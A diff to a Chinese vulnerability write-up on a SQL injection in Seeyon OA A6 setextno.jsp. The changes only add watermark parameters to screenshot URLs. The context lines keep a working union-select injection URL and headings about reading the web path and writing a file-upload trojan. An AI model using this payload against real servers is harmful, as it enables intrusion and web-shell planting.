@@ -24,11 +24,11 @@
 http://xxx.xxx.xxx.xxx/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(99999) union all select 1,2,(md5(1)),4# 
 ```
 
-![](http://wikioss.peiqi.tech/vuln/zhiyuan-37.png)
+![](http://wikioss.peiqi.tech/vuln/zhiyuan-37.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 查看web路径
 
-![](http://wikioss.peiqi.tech/vuln/zhiyuan-38.png)
+![](http://wikioss.peiqi.tech/vuln/zhiyuan-38.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 写入文件上传木马
 
@@ -38,7 +38,7 @@ http://xxx.xxx.xxx/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(9999
 
 剩下的步骤参考另一篇 **致远OA A6 test.jsp SQL注入漏洞**
 
-![](http://wikioss.peiqi.tech/vuln/zhiyuan-40.png)
+![](http://wikioss.peiqi.tech/vuln/zhiyuan-40.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 ## 漏洞利用POC
 
@@ -97,7 +97,7 @@ if __name__ == '__main__':
     Scan(file_name)
 ```
 
-![](http://wikioss.peiqi.tech/vuln/zhiyuan-39.png)
+![](http://wikioss.peiqi.tech/vuln/zhiyuan-39.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 ## Goby & POC
 
@@ -107,4 +107,4 @@ if __name__ == '__main__':
 >
 > Seeyon_OA_A6_setextno.jsp_SQL_injection
 
-![](http://wikioss.peiqi.tech/vuln/zhiyuan-43.png)
+![](http://wikioss.peiqi.tech/vuln/zhiyuan-43.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
